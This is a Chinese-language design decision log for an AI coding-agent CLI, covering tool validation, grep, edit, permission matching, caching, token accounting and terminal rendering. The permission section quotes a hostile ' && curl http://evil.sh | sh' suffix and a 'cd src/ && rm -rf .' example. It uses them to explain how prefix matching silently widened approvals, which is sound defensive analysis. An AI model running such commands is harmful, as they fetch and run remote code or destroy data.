- **A 的风险是“顺手改了发给模型的契约”，用机器导出的护栏堵住。** `scripts/fixtures/tool-schemas-baseline.json` 是改造**前**跑一次导出的快照（不是手打的），④ 段按 `JSON.stringify` 逐字比对——收敛源头时连一个键序、一个 `required: []` 都不许变

**代价：**
- **spec 是自研 DSL，新人要先学它。** 5 个构造器的语义只活在注释里；Zod 是社区通用的，会 Zod 的人不用学
- **形状是穷举的，要新形状就得改框架文件。** 哪天要“数组参数”或“路径必须存在”，改动落在 `spec.ts`（加构造器 + 加 `coerce` 分支 + 加断言）而不是落在工具文件里。这是刻意的：不做通用表达力，就不会长出没人用的死代码
- **`parse` 是可选成员，“忘了写”仍然合法。** 手写一个不走 `defineTool` 的 `ToolDefinition` 就绕过全部校验，编译期不拦。实测过把 `parse` 改成必需成员：`tsc --noEmit` 仍 0 错（全项目只有 `defineTool` 一处构造 `ToolDefinition`，而 `scripts/` 不进类型检查），所以必需也强制不了什么；真正的防线是 `verify-spec` ⑤/⑥ 段的源码断言（手段断言，改写措辞会误报）
- **`permissionKey` / `permissionDetail` 拿的仍是未校验的原始 args。** 权限确认发生在 `agent-loop` 调 `execute` **之前**，那时还没 parse。`edit` 的 permissionDetail 里那句 `String(args.replaceAll)` 因此消不掉，`verify-spec` 5-5 把这件事钉成了显式断言（handler 区 0 处 / permissionDetail 区 1 处）而不是假装它不存在
- **两处刻意宽容会变成未来的死代码。** 数字字段接受数字字符串、布尔字段接受 `'true'` / `'false'`（模型常这么传，拒了只是白烧一轮），代价是 `coerce` 里多两条特例分支
- **结构化返回值这一步没做。** handler 仍返回字符串、前缀仍是工具层与消费层之间唯一的协议。ARCHITECTURE_LOG 2026-09-05 那块把它记作“那是工具参数校验框架那一步的事”，本轮只做了参数校验这一半

## 2026-09-05 — `[INVALID]` 该由谁承担“计入失败”：改消费侧一行名单，还是改生产侧 12 处前缀

**场景：** `agent-loop.ts` 的 `failed` 判定式只认 `[ERROR]` / `[VERIFY_FAILED]`，于是工具层报 `[INVALID]`（参数不合法：缺参、空值、坏正则、坏 glob）时不计入失败，“重复失败保护”对“模型把参数写错”这一整类**完全失效**——实测 grep 缺 `pattern` 连传三次，三次都只拿回干净的 `[INVALID]`，`if (failed)` 一次也没进，两条 `[系统提示]` 一次也没注入。根因不是写错了名单，而是**分类表里根本没给 `[INVALID]` 留位置**：2026-09-03 那版分类是硬失败 / 有效否定 / 用户拒绝三类，它三类都不属于，而判定式是白名单——落不进任何一类就等于默认不计。要修就得先定一件事：这个前缀的语义该在哪一层被纠正。

**方案 A（改消费侧：把 `[INVALID]` 加进 agent-loop 的失败名单）：** 一行 `|| resultContent.startsWith('[INVALID]')`。全库 12 处产生 `[INVALID]` 的代码一个字不动，模型看到的文案也不动。

**方案 B（改生产侧：把 12 处 `[INVALID]` 全改报 `[ERROR]`）：** 不动 agent-loop，让工具层在“参数不合法”时也报硬失败前缀。效果与 A 等价（都进 `failed`）。

**方案 C（给 `[INVALID]` 单开一类计数器与专属文案）：** 参数错误比执行错误更确定（原样重试必然再错），提示可以更严厉、阈值可以更低（第 1 次就说）。

**选择：A**

**理由：**
- **B 会抹掉一个有信息量的区分。** `[INVALID]` 与 `[ERROR]` 告诉模型的是两件不同的事：前者说“你的参数不合法，改参数”，后者说“命令执行失败了，去查环境”。合并前缀等于把这个信息丢掉，而模型正是靠这段文本决定下一步做什么。B 还要改 12 处生产点 + 跟着改钉这些前缀的断言（verify-tools 的 B 段与 G 段、verify-edit 的参数边界段），改动面比 A 大一个量级而收益为负
- **A 改的是“分类”，本来就该在分类点改。** `agent-loop.ts` 的 `failed =` 那一行是全库唯一的分类点，它之后才有 `if (failed)` 的计数与两条提示注入。洞在这里，就补这里
- **C 的更严厉文案没有落点。** 现有两条提示（“停止用相同参数重试” / “放弃这条路径”）说的恰好就是参数错误最该听的话，再写一套要动文案 + 动断言；而“第 1 次就念”会误伤模型的正常试错（它第一次写错参数是常事，不是错）
- **A 的风险是“闸门开太大”，用对照组堵住。** 只钉“`[INVALID]` 触发保护”（A4）的话，A 可以被顺手实现成“除了 `[OK]` 都算失败”而照样全绿——那条路会让模型每查一个不存在的符号都被念一次。所以 A4 必须配 A5（`[NO_MATCH]` 反复出现**不**触发），两条一起才钉住“改的是分类，不是把闸门全打开”

**代价：**
- **分类表现在写在注释里，仍然靠人维护**：三类（硬失败 / 无效输入 / 有效否定）的边界只存在于 L237-245 那段注释与两处源码断言里，没有类型约束。加一个新前缀仍要靠人记得改名单
- **两处源码文本断言（E11/C4）本轮被查出是假绿**：它们的判定式是子串匹配，把第三个前缀加在同一行时照样绿。已改成“名单精确相等”（既验存在也验排他），但这类断言天生脆——它们钉的是源码文本而不是行为
- **`edit` 的承重注释里那条“不要用 `[INVALID]`”的理由变了**：原文写“不要改成 [NO_MATCH] / [INVALID]”，现在 `[INVALID]` 行为上已等价，故精确化为“0 命中不是参数格式不合法，而是文件内容与模型预期不符——参数本身完全合法，语义上仍属执行失败”。结论不变、换掉理由
- **有效否定那一侧只钉了 `[NO_MATCH]`**：`[NOT_FILE]`/`[NOT_DIR]`/`[EMPTY]` 归入不计失败是本轮写进注释的，但 A5 只用了 `[NO_MATCH]` 一个替身，其余四个若被挪走，A5 红的原因看不出是它们

## 2026-09-04 — grep 在 Windows 上完全不可用且谎报：改成纯 Node 自实现，还是按平台分支调 findstr/grep，还是只修诚实性

**场景：** 实测确认 `grep` 拼的是 POSIX 串 `grep -rn ... 2>/dev/null | head -50`，而 `execSync` 在 Windows 走 `cmd.exe`：`grep` 不存在、`2>/dev/null` 被当成路径。搜一个确实存在的符号与搜一个绝不存在的串返回**一模一样**的 `[NO_MATCH]`，而 `agent-loop` 把 `NO_MATCH` 归为“有效否定（不计失败）”，所以模型会安静地拿着“项目里没有这个符号”的错误结论继续走。修法上有个真取舍：这里有两个独立问题——**能力坏了**（搜不到）与**它撒谎**（把“跑不起来”报成“没有”）。

**方案 A（只修诚实性，不修能力）：** 保留 shell 调用，只把 catch 里的 `[NO_MATCH]` 改成 `[ERROR]`。Windows 上 grep 仍然一次也搜不到，但模型至少会看到“命令执行失败”并触发重复失败保护。

**方案 B（按平台分支：Windows 调 findstr，其他调 grep）：** 两个分支各自拼自己的参数与转义规则，能力保留。

**方案 C（纯 Node 自实现遍历 + JS 正则）：** 不再 shell 出去，`readdirSync` 递归 + `readFileSync` + `new RegExp` 逐行试，自己控上限与跳过规则。

**选择：C（并包含 A）**

**理由：**
- **A 是必须做的底线，但单做 A 等于交个半残的工具。** 模型收到 `[ERROR]` 后会反复重试或换别的笨办法（一个个 read 文件），比直接给它一个能用的 grep 贵得多。所以最终落地是 A 的诚实性 + C 的能力，两者不矛盾
- **B 被否的关键理由：findstr 的正则不是正则。** 它是有限子集（不支持 `{n,m}`、不支持分组回引、`/c:` 与转义规则自成一套），于是同一个 `pattern` 参数在两个平台上语义不同——**半残的正则比明说没有更骗人**，因为模型不知道自己拿到的是哪一套。B 还要维护两份 shell 转义，而引号规则本身就是本次 bug 的成因
- **C 的代价是已知且可接受的：** 自写遍历比 ripgrep 慢（无并行、无 SIMD），但本项目搜的是源码树，5000 文件 / 2MB 单文件 / 50 命中三个上限实测够用；换来的是**零外部依赖、跨平台行为一致**，与 `edit` 工具“不靠 shell 引号传代码”同一个取舍方向
- **自己实现才能把“扫了多少”说出来。** `[NO_MATCH]` 里回显“已扫 N 个文件”——0 命中时模型需要能区分“扫了 300 个文件确实没有”与“自己的 include 把所有文件都排除了”。这个信息 shell 版拿不到（`grep` 不报它跳过了什么）

**代价：**
- **glob 支持面比系统 grep 窄**：`include` 只认 `*` `?` `{a,b}`，不支持 `**` 与字符类 `[abc]`。要支持就得自写半个 glob 引擎，判定不值；不支持的部分**显式返回 `[INVALID]`**而不是静默过滤掉一切
- **行号与内容按行切分后重建**，不再能处理跨行匹配（多行正则）；改前的 `grep -rn` 同样不能，此处无退步
- **50 命中上限是硬编码**（与改前 `head -50` 同量级），命中封顶时只回“命中达上限已停止”、不分页
- **多一层自己写的二进制探测**（头部 8KB 内有 NUL 则跳），理论上会把“开头含 NUL 的合法文本文件”误判为二进制；不跳的话一个 .png 能把 50 个名额吃光，两害相权取其轻

## 2026-09-04 — 授权边界：工具自定义键 + 精确匹配，还是真路径 + 前缀匹配

**场景：** `agent-loop.ts` 的授权匹配键原先是 `JSON.stringify(args).slice(0, 80)`，而 `PermissionManager` 用 `startsWith` 做前缀匹配。这个组合实测会**静默扩权**：批准 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会自动放行——两个键在 80 字符处截成了逐字符相同的字符串。而 manager 注释声称的“目录级授权”（批准 `write:src/` 就放行整个目录）一次也没生效过，因为真实调用方传的键含内容片段。要修就得同时定两件事：键由谁定义、用什么匹配规则。

**方案 A（真路径 + 前缀匹配）：** 让调用方传结构化键（形如 `write:src/data.txt`），保留 `startsWith`，于是注释声称的目录级授权真的生效——批准一个目录，该目录下所有文件不再问。

**方案 B（工具自定义键 + 精确匹配）：** `core/tools.ts` 加**可选**成员 `permissionKey?`，由工具自己声明“这次授权的边界”（`write` / `edit` 给归一化后的路径、`bash` 给完整命令），`PermissionManager` 改用 `Set.has()` 精确匹配；兜底键改成**完整**的 args JSON（不截断）。

**选择：B**

**理由：**
- **A 的安全性依赖一个前提：键必须是路径语义。** 而键一旦交给工具定义，这个前提就不成立了——`bash` 的键是完整命令，`cd src/` 就以 `/` 结尾，若按“以 / 结尾就前缀放行”，批准 `cd src/` 等于批准 `cd src/ && rm -rf .`。要让 A 安全，得先有一个“只按路径授权”的独立入口（把文件类工具与命令类工具分开对待），那是另一件事，不能靠匹配规则顺带实现
- **失配是响的，扩权是静的。** B 的代价是用户可能多点几次“允许”（键差一个字符就重新弹窗），这个代价看得见；A 的代价是用户点一次就放出了他没看见的范围，而且没有任何提示
- **截断必须去掉，而 A 留着前缀匹配就等于留着截断的动机**：前缀匹配天然鼓励“把键截短一点、让更多调用共用一次授权”。B 把兜底键改成完整 args JSON——宁可长，不可截
- **做成可选成员不打坏替身**：全库 7 处 `ToolProvider` 替身，加必需成员会全部编译不过（与 `permissionDetail?`、`EventBus.emitHook?`、`SessionStorage.getAllStored?` 同一手法）

**代价：**
- **一处刻意的放宽**：`write` / `edit` 的键不含内容，所以“本次全部允许” = 本会话内不再问这个文件，哪怕下次改的是完全不同的片段（改前是“路径 + `oldText` 前 38 字符”，在那个维度上更窄）。换来的是这个选项真的有用——同一文件连续改多处不必反复点。已写成显式断言（`verify-permission.ts` ④ 段 5 项），免得后人当 bug 又改回去
- **目录级授权没有了**：授权 `write:src/` 不放行 `write:src/data.txt`。这个能力注释里声称过、实际从未生效过，现在明确写成不支持
- **`bash` 多一个空格就重新弹窗**（多个空格也算不同命令）。命令不像文件路径有天然的“同一个东西”边界，宁可多问一次
- **兜底键变长**：将来新增的改类工具若忘了定义 `permissionKey`，会用完整 args JSON 当键，长参数会让“本次全部允许”退化成“只允许这一次”——这是有意选的失效方向（失效表现为多问，而不是少问）

**参考：** [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 10 条 · [GLOSSARY.md](./GLOSSARY.md#permissionkey授权匹配键) · `src/permission/manager.ts` 的匹配注释 · `scripts/verify-permission.ts`（62 项，含“改前确实会放行”的对照组）

## 2026-09-04 — `edit` 工具命中多处时：拒绝并回报候选行号，还是改第一处

**场景：** 实现精准编辑工具 `edit` 时，`oldText` 在文件里命中多于一次的情况必须有明确处理。两种做法都能“跑通”，但失败的**可见性**差别很大。用户拍板：**拒绝 + 回候选行号**。

**方案 A（静默选一处改）：** 命中多处时改第一处（或最后一处），返回 `[OK]`。

**方案 B（拒绝，并回报候选行号）：** 命中多处时文件一字不动，返回 `[ERROR] oldText 命中 N 处，无法确定该改哪一处` + 候选行号（最多列 20 处）+ “给 oldText 加上下文使其唯一；确认每一处都要改成同样内容时才传 `replaceAll: true`”。

**选择：B**

**理由：**
- **A 的失败是静默的**：改错地方不会报错，`[OK]` 照发，模型会继续往下走，用户看到的是一段“成功”的编辑。等发现时文件已经被改坏，而且没人知道是哪一步坏的。B 的失败是响的——工具拒绝、文件不动、原因摆在眼前
- **候选行号让重试有方向**：只说“命中多处”，模型只能瞎猜该加什么上下文；给出“第 12, 47, 89 行”，它才知道这段文本在文件里是什么形态、该往前后各带几行才唯一
- **`replaceAll: true` 已经覆盖了 A 的正当用途**：真要“每一处都改成同样的内容”（改一个变量名、改一处配置的所有出现），显式传这个参数即可。B 没有牺牲任何能力，只是把“多处”从**默认行为**变成**显式意图**
- **与 0 命中的处理对齐**：0 命中同样是拒绝 + 一字不动。两条路径共用一个原则——**改类工具拿不准时拒绝，比猜一次的代价小得多**

**代价：** 模型改一个出现多次的标识符时会多一轮往返（先被拒绝、再补上下文或补 `replaceAll`），这是有意的：多花一轮换“不会静默改错地方”。另外候选行号最多列 20 处，超出时只报“仅列出前 20 处”，模型拿不到完整分布——真有几百处命中的场景（比如改一个单字母变量名），正确做法本来就是先 `read` 或用 `grep` 摸清，而不是让 `edit` 猜。

**参考：** [GLOSSARY.md](./GLOSSARY.md#edit精准编辑工具) · `scripts/verify-edit.ts` D 段（多命中 6 项，含“候选行号确为第 1, 3, 5 行”的断言）· ARCHITECTURE_LOG 2026-09-04 20:37 那块

## 2026-09-04 — `edit` 的定位机制：唯一原文片段，还是 apply_patch / diff 补丁块

**场景：** `edit` 要回答“改哪里”。两种主流做法都能实现，选哪种决定了**模型的出错形态**与工具的实现复杂度。

**方案 A（apply_patch / diff 补丁块）：** 模型输出带行号与上下文行的补丁块（`@@ -12,7 +12,7 @@`、`--- a/x.ts` / `+++ b/x.ts`），工具按块应用。

**方案 B（唯一原文片段）：** 模型照抄一段文件里**逐字符一致且唯一**的原文（`oldText`），工具用 `indexOf` 数命中次数，恰好 1 次才改。

**选择：B**

**理由：**
- **补丁块要求模型输出它最容易记错的东西——行号**。行号必须与文件当前状态精确对齐，差一行整块作废；而模型看到的文件内容往往是几轮之前 `read` 的，中间它自己可能已经改过。方案 B 让模型照抄**内容**，定位对不对由文件自己回答（命中 0 / 1 / 多次），不依赖模型记住行号
- **补丁块的格式错一格就全废**：`@@` 头的计数、上下文行的前导空格、`---`/`+++` 的路径，任一处不符解析就失败，而失败原因（“格式不对”）对模型没有指导性。方案 B 的失败原因永远是“这段原文找不到 / 找到多处”，直接指向下一步该做什么
- **B 内部用 `indexOf` 而不用正则，因为 `oldText` 里满是元字符**：`. * + ( ) [ ] ? ^ $ | \` 在真实代码里到处都是（`arr.map((x) => x.id)` 就含四个）。走正则就得先转义，漏转一个就把“改这一处”变成“改一片”——那是比拒绝严重得多的失败。字面匹配没有这个风险面（代价：`newText` 里的 `$1` 是字面量而非反向引用，这是刻意的——需要“按模式批量改写”的场景应该由模型显式写出每一处，而不是让工具替它推断）
- **实现只需四步、无新依赖**：读全文 → 数命中 → 切片拼接 → 按字节写回。不引入 diff 库，与“零运行时依赖”的既定路线一致（见 [DECISION_LOG.md](./DECISION_LOG.md) 2026-09-03 那条）

**代价：**
- **`oldText` 必须唯一，改短片段常常要带上下文**：改一个 `return null;` 得连带前后几行才唯一，模型输出的 token 比补丁块多。这是拿“多几个 token”换“不会静默改错地方”
- **表达不了模糊意图**：正则能一次改完 `foo1` / `foo2` / `foo3`，方案 B 只能靠 `replaceAll: true`（要求替换内容完全相同）或分多次调用
- **CRLF 与 BOM 得工具自己扛**：模型发来的 `oldText` 必然用 `\n`，而 `core.autocrlf=true` 检出的源码是 CRLF，不归一化则跨行匹配必然 0 命中。所以工具对纯 CRLF 文件做“归一化匹配 + 写回前整体还原”，并按字节读、按字节验证以保住 BOM（补丁块方案同样要处理这层，不是 B 独有的成本，但确实是本轮真花了力气的地方）

**参考：** [GLOSSARY.md](./GLOSSARY.md#edit精准编辑工具) · [GLOSSARY.md](./GLOSSARY.md#permissiondetail权限弹窗文案)（配套的弹窗文案契约）· `src/tools/builtin.ts` 的 `edit` · `scripts/verify-edit.ts`（41 项）

## 2026-09-02 — 模型列表怎么移出启动关键路径（内存预热 vs 纯懒加载 vs 落盘缓存+TTL）

**场景：** 启动提速第一档把网络探测后台化之后，界面渲染前还剩最后一批真实往返：`getConfigManager()` 会 `await init()`，为每个有 key 的供应商并行拉 `/models`，而 `check()` 又 await 它。实测这批请求冷连接 1998ms、连接池热时 278ms，网络差时每家最长卡 10s 超时——全程终端只有 banner 没有 UI（用户此前明确投诉过"UI 没在第一时间加载出来"）。ROADMAP 原案写的是"落本地缓存带时间戳（TTL 约 24h），启动只读缓存"。

**方案 A（内存预热 + 按需现拉）：** 启动路径 0 网络请求；main.ts 在界面渲染前 fire-and-forget 调 `warmModels()` 并行拉有 key 的几家，结果只写内存里的 Provider；`/model` 二级选择器展开前 `ensureModels()`——5 分钟新鲜期内零等待，还在飞就 await 同一个 promise（inflight 去重）。不落盘。

**方案 B（纯懒加载）：** 启动不拉也不预热，只有用户真开 `/model` 时才现拉那一家。

**方案 C（落盘缓存 + TTL，ROADMAP 原案）：** `/models` 结果写本地文件带时间戳（TTL 约 24h），启动只读缓存，`/model` 时才主动刷新。

**选择：A**

**理由：**
- 调研发现 `getModels()` 的 9 个调用点里**只有 `/model` 的二级选择器真需要远程列表**：其余要么只是说明文字，要么静态列表就满足（连 `getFallback()` 点名要的 `deepseek-v4-flash` 都在 opencode-go 的静态表里）。既然只有一个消费者，缓存就该服务于"打开它的那一刻别等"，而不是"跨进程复用"
- 方案 C 为一个内存里的数组配一整套机械：缓存文件、TTL 失效、baseUrl 变更失效、写盘失败处理、gitignore、旧缓存与新配置不一致……而它换来的只是"下次启动省一次后台请求"——可 A 已经让启动路径一次请求都不发了，那份收益是 0
- 方案 B 更省，但把 0.3~0.9s（实测单家 913ms / 552ms）原封不动搬到用户点开菜单那一刻，而用户对"点了没反应"的敏感度远高于启动多等半秒；A 用一次用户感知为零的后台预热把这段时间藏起来
- A 的代价可控且都在明处：进程重启即重新拉（模型列表的变化频率是"月"级，5 分钟新鲜期已远超需要）；断网时启动照样过——自检（`probeStartup`）本来就在后台，列表有静态兜底

**代价：** 活动供应商启动时会被拉两次（`warmModels` 一次 + `probeStartup` 一次）。**不合并是有意的**：probe 要靠 HTTP 状态码分档（401 → key 无效），而 `fetchRemoteModels` 把状态码吞了；为省一次**后台**请求（用户感知为零）把两者耦起来不划算。另外 `/model` 一级列表的"N 个模型可用"在预热完成前显示的是静态数（13 而非 33），只影响说明文字。

**参考：** `src/config/manager.ts` 的 `warmModels/ensureModels/isModelsFresh/startRefresh`、`src/llm/provider.ts` 的 `modelsFetchedAt`、`src/harness/main.ts` 的 TTY 分支、`scripts/verify-startup.ts` S1/S7/S9/S10

## 2026-09-02 — 流式用量怎么拿（显式索取 + 撞墙降级 vs 一律不索取继续估算）

**场景：** 可观测层落地后 `llm_request_end.usage` 恒为 null：OpenAI 兼容协议**默认不在流式响应里给用量**，必须靠 `stream_options.include_usage` 显式索取；Anthropic 则把用量拆在 `message_start`（输入）与 `message_delta`（输出累计值）两个事件里，不解析就永远拿不到。于是 token 数只能靠 `estimateTokenUsage` 本地估算，而它只算 user 输入 + 最终回复：多轮工具循环的中间消息、system prompt、5 个工具描述全没算。实测同一条冒烟：估算 {26,23,49} vs API 真值 {2834,71,2905}，输入侧少报约 109 倍。

**方案 A（显式索取 + 降级）：** 带上 `stream_options.include_usage`；若端点因这个参数报 400，则关掉进程级开关并在同一次调用内静默重试一次（不带该参数）。Anthropic 侧解析两个用量事件，输入把两个缓存字段加回来。

**方案 B（一律不索取）：** 保持现状，token 数永远靠本地估算，`usage` 槽位继续留空。

**选择：A**

**理由：**
- 估算与真值差两个数量级，`/usage` 与 `prompt_end.totalUsage` 一直在报一个口径完全不对的数——这不是"精度差一点"，是把 system prompt 与工具描述整体当成不存在
- 代价可控：降级后的行为与方案 B **完全一致**（usage 继续 null、上层回退估算），用户看不到失败，不会为了一个统计参数把对话搞挂
- 开关做成进程级而非每次探测：撞过一次就不再白跑一趟；只有错误文本里含 `stream_options` 才降级，其他 400（密钥无效、余额不足）原样抛出，不误吞真错误
- Anthropic 的 `input_tokens` 只统计"本次新读的非缓存部分"，而本项目在 system 分层与 tools 上都设了 `cache_control` 断点——命中时它只剩个位数，不把 `cache_creation` 与 `cache_read` 加回来，报出来的"真值"会比估算更离谱

**代价：** 首次撞上严格代理端时多一次失败往返；开关是进程级的，同进程内从不兼容端切到兼容端也不会再索取（重启才恢复）；缓存命中率这个最能省钱的信息被合并进 `promptTokens` 了（`LLMUsage` 只有三个槽）。

**参考：** `src/llm/stream-helper.ts` 降级段、`src/llm/anthropic.ts` `AnthropicStreamUsage`、`scripts/verify-usage.ts` U1/U5/U11/U12/U13

## 2026-09-02 — 多轮合计不完整时怎么报（整体 null vs 报部分合计）

**场景：** 一次 prompt 可能有多轮 LLM 往返（工具循环），而任一轮都可能拿不到用量：流中途异常、端点不支持索取、降级后重试的那轮。`AgentLoopResult` 只能交一个合计值出去。

**方案 A（整体 null）：** 任一轮缺失 → `usage: null`，Runtime 回退 `estimateTokenUsage`。

**方案 B（报部分合计）：** 把拿到的那几轮相加报出去，缺的当 0。

**选择：A**

**理由：**
- B 报出的是一个"看起来是真值"的少报数字，消费端无法区分"这就是全部"与"这只是其中几轮"——它比明确的估算值更误导，因为估算值大家都知道是估的
- null 与 0 在本项目里一直是两件事（0 = 真的收到 0 个字，null = 无从统计），`firstTokenMs`、`textLength` 等 span 结果字段全是这套语义，用量沿用同一套才不必教消费端两种读法
- 回退路径本来就存在（`usage ?? estimateTokenUsage(...)`），A 不新增分支，消费端一行未改

**代价：** 多轮任务里只要一轮缺失，整段真值全丢，退回精度差两个数量级的估算；实现上还得绕一个坑——TS 的控制流分析不追踪闭包内的赋值，用量必须经 `trace()` 回调的**返回值**上送，写成"回调内改外层 let"会被锁死成初始的 null（本次为此连撞两轮 `never` 报错）。

**参考：** `src/core/loop.ts` `AgentLoopResult.usage` 注释、`src/loop/agent-loop.ts` `usageComplete`、`scripts/verify-usage.ts` U8/U9/U10

## 2026-09-02 — 可观测性的落地路径（先补事件语义 vs 直接引 LangSmith）

**场景：** 用户提出"引入 LangSmith 帮助记录某个行为的结果和报错"。现状四层日志（启动自检 `Diagnostic[]`、运行时诊断队列、51 处裸 console、两个 env 调试日志）全部是**离散点**：无 traceId/spanId/parentId、无时间戳无耗时、不记输入输出、无树形结构。一次带 3 个工具调用的 prompt 实际发生 4 次 LLM 往返，对外却一个边界事件都没有。

**方案 A（先补事件语义）：** 自研 span 层——总线 emit() 盖 at/seq/turnId 公共头，四组强类型骨架 span 覆盖三重循环，消费者写成扩展 hook 落本机 JSONL。零运行时依赖不破。

**方案 B（直接引 LangSmith SDK）：** `optionalDependencies` + 动态 import 规避破零依赖，把现有事件流映射成 run tree 上报云端。

**选择：A**

**理由：**
- LangSmith 记的是"一次调用的树"，而现有事件是扁平的离散点——**没有边界（无成对 start/end）就没有树**，接进去也只能上报一堆无父子的孤点，等于把语义欠账搬到云端
- 实测 langsmith@0.10.1：直接依赖 p-queue、传递 4 包、解包 3.2MB，与 `package.json` 的 `dependencies` 为空这一立项目标冲突
- 数据出网：完整 messages / 工具参数 / 输出会上 api.smith.langchain.com
- 进程硬退出丢队列：`/exit`、SIGINT、SIGTERM 三条路径都走 `process.exit()`，未 flush 的上报直接消失
- 先定语义则后端可插拔（换 LangSmith / LangFuse 只是在 `hooks/` 再放一个文件），先选后端则被其私有 run 模型锁死

**代价：** 暂无跨会话聚合看板与云端 UI，只有本机 JSONL；日后若真要接 LangSmith，需再写一个 hook 做字段映射，且上述四条现实一个不少。

**参考：** `Log/ROADMAP.md` P6 "可观测性增强"（本次落地）；`Log/ARCHITECTURE_LOG.md` 2026-09-02 16:26

## 2026-09-02 — span 契约形态（强类型骨架 + 自由便签双通道 vs 单一自由通道）

**场景：** 新增一个观测点要不要每次改核心事件类型。用户拍板："路 A 身份证用于骨架的核心事件，路 B 作为便签用于记录扩展 hook 里的内容，想加就加"。

**方案 A（双通道）：** 骨架 span（prompt / llm_request / tool_call / compaction）事件类型即 `<name>_start`，载荷由 `SpanContracts` 的 interface 约束；便签 span 事件类型固定 `note_start` / `note_end`，段名降级成 `name` 字段、载荷是自由字典。

**方案 B（单一自由通道）：** 全部走 `note_*` + `attrs` 字典，核心永不为观测改动。

**选择：A**

**理由：**
- 骨架那四段是 **UI 要直接消费**的（判红绿、显示耗时与首字延迟），字段名打错必须编译期就炸；自由字典要到运行时才发现，而运行时发现的代价是 UI 静默显示错数
- 便签通道保留了方案 B 的全部好处：用户在 hook 里圈任意一段，核心零改动
- 双通道的分工正好对上两种不同的变更频率："系统必须观测的四处"（极少变）与"临时想看的任意一处"（随时变）

**代价：** 核心有两套发射路径（`openSpan` 的 note 分支）；加一个骨架段要改 `runtime/events.ts` 两处（interface + SpanContracts）；`beginSpan` 收到集合外的段名只能运行时 `console.warn` 一次兜底。

## 2026-09-02 — 出门载荷字段必填 vs 可缺（异常段不得伪报）

**场景：** `llm_request` / `tool_call` 段在流中途抛异常时，`firstTokenMs` / `textLength` / `resultLength` / `usage` 根本没有值可报——`span.set()` 那一行并未执行到。

**方案 A（可缺，缺失即"无从统计"）：** 结果字段全部可选，只有 `status` / `durationMs` 由总线算、永远在；`usage` 用 `null` 表示"Provider 没给"，与 0 区分。

**方案 B（必填，异常路径补 0 / 补空串）：** 类型上所有字段必填，异常时填默认值。

**选择：A**

**理由：**
- 填 0 等于伪报：0 个 token 与"没统计到"是两件事，消费端无法区分，画出图表就是假数据
- `verify-events.ts` 第一次跑就抓到这个契约谎言：异常段报 `resultLength 不存在`——**这是正确语义**（工具崩了就没有结果体量），是类型把它写成了必填
- `agent-loop` 事后拼的 `[工具 X 执行失败]` 文本是兜底话术，不是工具输出，不该算体量
- `usage` 槽位当前两个 Provider 的流式路径都还没填（`llm/types.ts` 的 end 事件已留位），写成必填就会逆逼真报 0；写成 `LLMUsage | null` 则填上之后自动变真值、消费端不必改

**代价：** 消费端每个字段都要判存在性（TreeUI 里 `typeof event.durationMs === 'number'` 这类守卫）；`exactOptionalPropertyTypes` 下生产端赋值必须用条件展开，写法啰嗦。

## 2026-09-02 — 歧义宽字符的测宽口径（显式窄区段表 vs 完整 wcwidth 表）

**场景：** `fit-width.ts` 的字符列宽判定。旧规则 `charCode > 0xff 即 2 列` 把制表画框字符 `─│┌┐└┘═` 也算成 2 列，76 字符的边框被测成 140 列，`Text.render` 的 `fitWidth(width-1)` 把它砍到 45 字符，右侧 `┐ ┘` 整段丢失——框是破的；而 `Screen` 的行宽告警排在截断之后，结构上永远报不出来（真机 `debug-screen.log` 里 `newLine宽度=78` 就是 48 字 `━` 分隔线被砍到 39 字的痕迹）。

**方案 A（显式窄区段表）：** 只把确定按 1 列绘制的非 ASCII 区段声明为窄（制表画框 U+2500–259F、箭头 U+2190–21FF、盲文 U+2800–28FF、`❯` U+276F），其余非 ASCII（汉字、全角标点、`— … “”`、emoji）维持 2 列。

**方案 B（完整 wcwidth 表）：** 按 Unicode East Asian Width 属性建全表，Ambiguous 一律按 1 列（wcwidth / xterm.js / Windows Terminal 的口径）。

**选择：A**

**理由：**
- 两种猜错的代价不对称：把窄字符测成宽 → 行提前折、提前截断，只浪费几列；把宽字符测成窄 → 行超出终端宽度触发软换行，而差分渲染按"一逻辑行 = 一终端行"记账，行数一错整屏错位
- 方案 A 修的正是必须修的那一类（UI 骨架字符：边框、分隔线、旋转帧、选择器光标），而这些字符在所有现代终端都由等宽西文字体绘制，1 列无争议
- `— … “” ①②③` 这类中文正文标点的真实宽度取决于终端字体回退（Consolas 有字形→ 1 列，回退到中文字体→ 2 列），无法离线判定；维持现状等于不引入新风险
- 方案 B 需约 90 个区段的静态表，且一旦用户终端把歧义字符画成宽（旧 conhost + 中文字体），全部中文正文行都会超宽错位

**代价：** 中文正文行会比实际显示宽度短若干列（每个 `— … “”` 少用 1 列），框内右侧略参差。

**参考：** `Log/CHANGE_LOG.md` 2026-09-02 12:33 [Fix🐛]；`scripts/verify-ui.ts` ⑥ 组

## 2026-09-02 — 进度指示器粒度与流式框收尾（回合级 + 就地封口 vs 事件驱动 + 整框重建）

**场景：** 用户反馈"回复中途会经历较长时间的等待，并没有状态栏提示，直到完全给出全部回复后上面的 UI 才会加上"。旧实现两处根因：① 指示器只消费 `thinking` 事件，而 `agent-loop` 内部一轮都不发该事件 → 工具执行期、工具结束到下一次 LLM 首字之间全程黑屏；② `agent_end` 时 `removeLiveBox()` 拆掉半成品框再用完整文本重建。

**方案 A（回合级指示器 + 就地封口）：** 指示器从 `onSubmit`（按下 Enter）点亮到 `agent_end` 才撤，位置随阶段迁移（等待期挂底部状态行，流式期挂回复框的开口底边）；收尾时只把开口底边那一行换成 `└──┘`，顶边框与正文原地不动。

**方案 B（事件驱动 + 整框重建，旧实现）：** 指示器只在收到 `thinking` 时显示、首片正文到达即撤；`agent_end` 拆框重建。

**选择：A**

**理由：**
- 差分渲染按行比较：重建让整框所有行同时变化 → 视觉上"闪一下重画"；就地封口只有底边一行变化
- 回合级指示器不依赖上游发不发事件，把"进度承诺"的缺口从根上堵住（事件驱动口径下，任何新增的不发事件的阶段都会重新出现黑屏）
- 流式期框已是完整形状（只差底边），开口底边常驻"正在输出… N 秒 · 已收 X 字"正好对应用户诉求"等输出完毕后再进行变化"
- 摘要行（💭 思考了 N 字 / ⏳ 用时 N 秒）可能在开框之后才凑齐（推理晚到、等待跨了工具轮），需往已成型的框中部插行 → 为此给 `Container` 补了 `insertChild(component, index)`

